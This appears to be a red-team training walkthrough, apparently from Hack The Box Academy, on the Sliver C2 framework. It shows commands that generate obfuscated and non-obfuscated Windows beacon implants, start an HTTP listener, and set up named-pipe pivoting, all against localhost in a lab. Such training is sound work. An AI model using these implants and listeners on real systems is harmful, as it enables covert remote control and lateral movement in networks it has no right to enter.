## Implants
#### Generating an implant in beacon mode

Below are two variants of generating an HTTP beacon while comparing the sizes between the non-obfuscated implant (`--skip-symbols`) and the obfuscated implant. For simplicity's sake, binaries are generated with names that are not randomized, which is the default for `Sliver`.

```sh
sliver > generate beacon --http 127.0.0.1 --skip-symbols -N http_beacon --os windows

[*] Generating new windows/amd64 beacon implant binary (1m0s)
[!] Symbol obfuscation is disabled
[*] Build completed in 2s
[*] Implant saved to /home/htb-ac-8414/http_beacon.exe
```

By checking the size of the generated implant we can see the size being 11MB.

```sh
3kjS@htb[/htb]$ ls -lh /home/htb-ac-8414/http_beacon.exe
-rwx------ 1 htb-ac-8414 htb-ac-8414 11M Sep 28 12:29 /home/htb-ac-8414/http_beacon.exe
```

Generating an obfuscated implant in beacon mode.

```sh
sliver > generate beacon --http 127.0.0.1 -N http_beacon_obfuscated --os windows

[*] Generating new windows/amd64 beacon implant binary (1m0s)
[*] Symbol obfuscation is enabled
[*] Build completed in 19s
[*] Implant saved to /home/htb-ac-8414/http_beacon_obfuscated.exe
```

By checking the size of the generated obfuscated implant we can see the significant different of the size being 17MB.

```sh
3kjS@htb[/htb]$ ls -lh /home/htb-ac-8414/http_beacon_obfuscated.exe
-rwx------ 1 htb-ac-8414 htb-ac-8414 17M Sep 28 12:33 /home/htb-ac-8414/http_beacon_obfuscated.exe
```

Whenever we issue strings over the binary we can see the non-obfuscated leftovers of the implant such as `github.com/bishopfox/sliver/implant/sliver/version/version_windows.go` import. A visual representation can be seen in the terminal snippet below.

```sh
3kjS@htb[/htb]$ strings http-beacon-skipSymbols.exe | grep sliver | tail -10
```
#### Listeners

```sh
sliver > http --lport 8088

[*] Starting HTTP :8088 listener ...
[*] Successfully started job #2

sliver > jobs

 ID   Name   Protocol   Port    Stage Profile 
==== ====== ========== ======= ===============
 1    grpc   tcp        31337                 
 2    http   tcp        8088
```
#### Named pipes

![](Screenshot%202026-11-02%20at%2014.35.10.png)

In `Sliver`, named pipes are primarily used for pivoting on Windows as it is the only supported operating system at the time of writing. Generating a pivot listener follows a different approach, requiring an established session on a target. A pivot listener is close to a bind shell; we are starting a pivot listener on Host A, and from Host B, we will connect to Host A, establishing a chain of communication between the two hosts. This method is used in environments where traffic routing is quite restricted.

```sh
[server] sliver (http_beacon) > pivots named-pipe --bind academy

[*] Started named pipe pivot listener \\.\pipe\academy with id 1
```

After starting the pipe pivot listener, we need to generate a pivot implant using the `generate` command.

```sh
sliver > generate --named-pipe 127.0.0.1/pipe/academy -N pipe_academy --skip-symbols

[*] Generating new windows/amd64 implant binary
[!] Symbol obfuscation is disabled
[*] Build completed in 1s
[*] Implant saved to /home/htb-ac-8414/pipe_academy.exe
```